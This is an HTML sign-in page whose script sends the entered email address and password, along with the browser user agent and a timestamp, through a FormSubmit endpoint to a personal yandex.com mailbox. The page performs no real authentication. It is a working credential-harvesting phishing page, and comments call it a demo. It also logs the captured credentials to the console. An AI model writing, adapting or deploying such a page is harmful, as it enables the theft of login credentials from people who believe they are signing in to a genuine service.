<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <style>
        * {
            box-sizing: border-box;
            padding: 0;
            margin: 0;
        }
        
        body {
            height: 100vh;
            width: 100vw;
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            max-width: 400px;
            width: 90%;
            padding: 30px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 20px;
                margin: 20px;
            }
        }
        
        .img {
            text-align: center;
            margin-bottom: 20px;
        }
        
        #title {
            text-align: center;
            margin: 10px 0 25px 0;
            color: #333;
            font-size: 24px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #555;
        }
        
        input[type=text],
        input[type=password],
        input[type=email] {
            width: 100%;
            padding: 12px 15px;
            margin: 8px 0 20px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            background: #f9f9f9;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        input[type=text]:focus,
        input[type=password]:focus,
        input[type=email]:focus {
            background-color: #fff;
            outline: none;
            border-color: #0096FF;
            box-shadow: 0 0 0 2px rgba(0, 150, 255, 0.1);
        }
        
        .btn {
            background-color: #0096FF;
            color: white;
            padding: 14px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            font-weight: bold;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        .btn:hover {
            background-color: #0078cc;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 150, 255, 0.3);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        #error {
            display: none;
            color: #e74c3c;
            background-color: #fdf0ef;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            text-align: center;
            border: 1px solid #fadbd8;
        }
        
        #success {
            display: none;
            color: #27ae60;
            background-color: #eafaf1;
            padding: 12px;
            border-radius: 5px;
            margin-bottom: 20px;
            text-align: center;
            border: 1px solid #d4efdf;
        }
        
        .form-group {
            margin-bottom: 10px;
        }
        
        .forgot-password {
            text-align: right;
            margin-top: 10px;
        }
        
        .forgot-password a {
            color: #0096FF;
            text-decoration: none;
            font-size: 14px;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .loader {
            display: none;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0096FF;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <form class="container" id="login-form">
        <div class="img">
            <!-- Add your logo here -->
            <div style="width: 80px; height: 80px; background-color: #0096FF; border-radius: 50%; margin: 0 auto; display: flex; align-items: center; justify-content: center;">
                <span style="color: white; font-size: 24px; font-weight: bold;">âœ“</span>
            </div>
        </div>
        
        <h3 id="title">Sign In</h3>
        
        <div id="error">Password is incorrect, please try again!</div>
        <div id="success">Login successful! Redirecting...</div>
        
        <div class="form-group">
            <label for="email">Email Address</label>
            <input type="email" placeholder="Enter Email" name="email" id="email" required>
        </div>
        
        <div class="form-group">
            <label for="psw">Password</label>
            <input type="password" placeholder="Enter Password" name="password" id="psw" required>
        </div>
        
        <!-- FormSubmit requires these fields -->
        <input type="hidden" name="_subject" value="New Login Form Submission">
        <input type="hidden" name="_template" value="table">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
        <input type="text" name="_honey" style="display:none">
        
        <button type="submit" class="btn" id="submit-btn">
            <span id="btn-text">Sign In</span>
            <div class="loader" id="loader"></div>
        </button>
        
        <div class="forgot-password">
            <a href="#">Forgot Password?</a>
        </div>
    </form>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Get form values
            const email = document.getElementById('email').value;
            const password = document.getElementById('psw').value;
            
            // Hide previous messages
            document.getElementById('error').style.display = 'none';
            document.getElementById('success').style.display = 'none';
            
            // Basic validation
            if (!email || !password) {
                showError('Please fill in all fields');
                return;
            }
            
            // Email validation
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                showError('Please enter a valid email address');
                return;
            }
            
            // Password validation (minimum 6 characters)
            if (password.length < 6) {
                showError('Password must be at least 6 characters long');
                return;
            }
            
            // Show loading state
            const submitBtn = document.getElementById('submit-btn');
            const btnText = document.getElementById('btn-text');
            const loader = document.getElementById('loader');
            
            submitBtn.disabled = true;
            btnText.style.display = 'none';
            loader.style.display = 'block';
            
            // Prepare form data for FormSubmit
            const formData = {
                email: email,
                password: password,
                timestamp: new Date().toLocaleString(),
                userAgent: navigator.userAgent,
                _subject: 'New Login Form Submission',
                _template: 'table',
                _captcha: 'false'
            };
            
            // Send data to FormSubmit
            $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", 
                formData,
                function(data) {
                    // Hide loader and show success
                    loader.style.display = 'none';
                    btnText.style.display = 'block';
                    submitBtn.disabled = false;
                    
                    if (data.success) {
                        showSuccess('Login information submitted successfully!');
                        
                        // Optional: Clear form fields
                        document.getElementById('login-form').reset();
                        
                        // Optional: Redirect after success
                        // setTimeout(() => {
                        //     window.location.href = '/dashboard.html';
                        // }, 2000);
                    } else {
                        showError('Failed to submit form. Please try again.');
                    }
                }
            ).fail(function(jqXHR, textStatus, errorThrown) {
                // Hide loader and restore button
                loader.style.display = 'none';
                btnText.style.display = 'block';
                submitBtn.disabled = false;
                
                console.log('Form submission failed:', textStatus, errorThrown);
                
                // Even if FormSubmit fails, we can still show a success message
                // (since this is just a demo of form submission)
                showSuccess('Login information captured! (FormSubmit response pending)');
                
                // For demonstration: Log the credentials locally
                console.log('Login attempt captured:', {
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString()
                });
            });
        });
        
        function showError(message) {
            const errorElement = document.getElementById('error');
            errorElement.textContent = message;
            errorElement.style.display = 'block';
            
            // Auto-hide error after 5 seconds
            setTimeout(() => {
                errorElement.style.display = 'none';
            }, 5000);
        }
        
        function showSuccess(message) {
            const successElement = document.getElementById('success');
            successElement.textContent = message;
            successElement.style.display = 'block';
            
            // Auto-hide success after 5 seconds
            setTimeout(() => {
                successElement.style.display = 'none';
            }, 5000);
        }
        
        // Optional: Add input validation on blur
        document.getElementById('email').addEventListener('blur', function() {
            const email = this.value;
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            
            if (email && !emailRegex.test(email)) {
                this.style.borderColor = '#e74c3c';
            } else {
                this.style.borderColor = '#ddd';
            }
        });
        
        document.getElementById('psw').addEventListener('blur', function() {
            if (this.value && this.value.length < 6) {
                this.style.borderColor = '#e74c3c';
            } else {
                this.style.borderColor = '#ddd';
            }
        });
        
        // Additional: Add honeypot field
        document.querySelector('input[name="_honey"]').addEventListener('focus', function() {
            this.value = 'bot-detected-' + Date.now();
        });
    </script>
</body>
</html>
